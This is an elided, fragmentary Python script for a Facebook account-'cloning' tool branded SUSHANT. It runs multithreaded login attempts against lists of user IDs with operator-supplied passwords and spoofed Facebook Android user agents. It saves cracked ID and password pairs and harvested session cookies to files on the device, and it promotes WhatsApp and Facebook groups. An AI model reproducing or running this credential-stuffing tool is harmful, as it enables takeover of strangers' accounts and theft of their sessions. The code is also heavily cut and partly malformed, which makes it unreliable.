...
os.system('clear')
print('    \x1b[1;96m      \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0m \x1b[1;96m WELCOME TO SUSHANT COMMAND  \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m\n')
print('  \x1b[0m ╭──────────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0mSUSHANT Command \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m ─────────────╮')
...
from concurrent.futures import ThreadPoolExecutor as HamzaSUSHANT
from string import * 
...
totaldmp = 0
filter = []
network = random.choice(["Telenor", "UFONE-PAKTel", "Zong", "Jazz", "SCO", "Jio", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Robi", "Banglalink", "Teletalk", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange"])

def user_agent():
	fban = random.choice(["FB4A","FB5A","FB6A"])
	fbav = random.randint(200, 440)
	fbbv = random.randint(100000000, 777777777)
	fbpn = random.choice(["com.facebook.katana", "com.facebook.orca"])
	fbcr = random.choice(["Telenor", "UFONE-PAKTel", "Zong", "Jazz", "SCO", "Jio", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Robi", "Banglalink", "Teletalk", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange"])
	fbsv = random.randint(6, 12)
...
def iAmMethod4Ua():
	...
	ua =random.choice(["",])
	return ua
sys.stdout.write('\x1b]2; SUSHANT\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(35*'─')
        input("Press enter to back SUSHANT Menu ")
        exit()
...
python FILE.py''')
       ...
       os.system(' xdg-open https://chat.whatsapp.com/EWQJ7ZR5tgp3HpXnRVLTMb')
        ...
        os.system('xdg-open https://www.facebook.com/groups/3485407371707529/?ref=share')
    else:
        print('\n Select Wrong option ... ')
        time.sleep(2)
        SUSHANT(allkey)
...
def method_crack():
    ...
    clear()
    print(35*'─')
    print(" \x1b[1;92m•\x1b[1;91m•\x1b[1;96m•\x1b[0m    SELECT METHOD    \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m")
    print(35*'─')
    print("\x1b[1;92m•\x1b[1;91m•\x1b[1;96m•\x1b[0m METHOD 2&3 IS IN PROCESSING \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m ")
    print(35*'─')
    print(f'[1] Method {1}')
    print(f'[2] Method {2}')
    print(f'[3] Method {3}')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SUSHANT] {loop} [M-1] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m]  {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            ...
            x1 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/realme;FBBD/realme;FBPN/{fbpn};FBDV/RMX3506;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
            x2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/realme;FBBD/realme;FBPN/{fbpn};FBDV/RMX3506;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SUSHANTb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SUSHANTb};{ckkk}"
                    print(f"\r{R} [SUSHANT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SUSHANT_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SUSHANT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
              #       print(f"\r\x1b[1;96m [SUSHANT-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SUSHANT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r [SUSHANT] {loop}  [M3] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m] {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 12)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            ...
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
            SUSHANT_ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/grameenphone;FBMF/Samsung;FBBD/Samsung;FBPN/{fbpn};FBDV/SM-M215F;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SUSHANT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SUSHANT_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SUSHANT_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r\x1b[1;96m [SUSHANT-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SUSHANT] {loop}  [M2] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m] {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
    ...
    def pasw(self):       
            ...
            clear()
            print(42*'─')
            print(' [•] How many passwords do you want to add')
            print(42*'─')
            sl = int(input(' [•] Put Limit:\x1b[1;93m '))
            print('\x1b[0m──────────────────────────────')
            if sl =='':
                ...
                for sr in range(sl):
                    pw.append(input(f' [•] Put Password {sr+1}:\x1b[1;96m '))
                    print('\x1b[0m──────────────────────────────')
            os.system("clear")
            print(logo)
            print(35*'─')
            print(f' [•] TOTAL IDS FOR CLONE  :\x1b[1;92m %s ' % len(self.id))
            print("\x1b[0m [•] Use Auto Clicker for more OK IDS")
            from datetime import datetime
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            print(" [•] Cloneing Start Time :\x1b[1;96m", current_time)
            print("\x1b[0m─────────────────────────────────────")
            with HamzaSUSHANT(max_workers=30) as SUSHANTworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ...
                                SUSHANTworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SUSHANTworld.submit(self.methodC, uid, name, pwx)
